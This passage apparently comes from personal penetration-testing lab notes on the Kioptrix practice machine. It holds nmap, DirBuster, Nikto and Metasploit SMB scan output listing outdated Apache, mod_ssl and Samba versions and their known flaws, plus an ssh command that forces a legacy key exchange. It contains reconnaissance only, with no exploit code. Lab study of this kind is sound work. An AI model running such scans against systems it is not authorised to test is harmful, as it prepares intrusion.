|_    closed: 1,3-4,6-7,9,13,17,19-21,23-26,30,32-33,37,42-43,49,53,70,79,81-85,88-90,99-100,106,109-110,113,119,125,135,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,444-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3006,3011,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5985-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32769-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_fcrdns: FAIL (No PTR record)
|_path-mtu: PMTU == 1500

Post-scan script results:
| reverse-index: 
|   22/tcp: 192.168.0.107
|   80/tcp: 192.168.0.107
|   111/tcp: 192.168.0.107
|   139/tcp: 192.168.0.107
|   443/tcp: 192.168.0.107
|_  32768/tcp: 192.168.0.107
Nmap done: 1 IP address (1 host up) scanned in 355.33 seconds
```

## dirbuster results: 

```zsh fold title:idk
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Mon Mar 17 11:41:53 EDT 2025
--------------------------------

http://192.168.33.26:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/icons/
/manual/
/manual/mod/
/usage/
/icons/small/
/mrtg/
/manual/mod/mod_perl/
/manual/mod/mod_ssl/

Dirs found with a 403 response:

/cgi-bin/
/doc/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/test.php
/usage/usage_202503.html
/usage/usage_200909.html
/mrtg/mrtg.html
/mrtg/unix-guide.html
/mrtg/nt-guide.html
/mrtg/cfgmaker.html
/mrtg/indexmaker.html
/mrtg/faq.html
/mrtg/reference.html
/mrtg/forum.html
/mrtg/contrib.html
/mrtg/mrtg-rrd.html
/mrtg/logfile.html
/mrtg/mibhelp.html
/mrtg/squid.html
/mrtg/webserver.html
/manual/mod/mod_ssl/ssl_overview.html
/manual/mod/mod_ssl/index.html
/manual/mod/mod_ssl/ssl_intro.html
/manual/mod/mod_ssl/ssl_reference.html
/manual/mod/mod_ssl/ssl_compat.html
/manual/mod/mod_ssl/ssl_howto.html
/manual/mod/mod_ssl/ssl_faq.html
/manual/mod/mod_ssl/ssl_glossary.html


--------------------------------
```
## nikto results: 

```zsh title:"nikto -h http://192.168.33.26" fold
┌──(root㉿kali)-[~]
└─# nikto -h http://192.168.33.26 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.33.26
+ Target Hostname:    192.168.33.26
+ Target Port:        80
+ Start Time:         2025-03-17 10:51:27 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ ERROR: Error limit (20) reached for host, giving up. Last error: 
+ Scan terminated: 13 error(s) and 18 item(s) reported on remote host
+ End Time:           2025-03-17 11:01:09 (GMT-4) (582 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## metasploit results:

```
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 192.168.33.26:139     -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.33.26:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## ssh enum documentation:
	
```c
ssh 10.0.2.15
Unable to negotiate with 10.0.2.15 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

```
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 10.0.2.15
```


- smbclient 
- smbmap 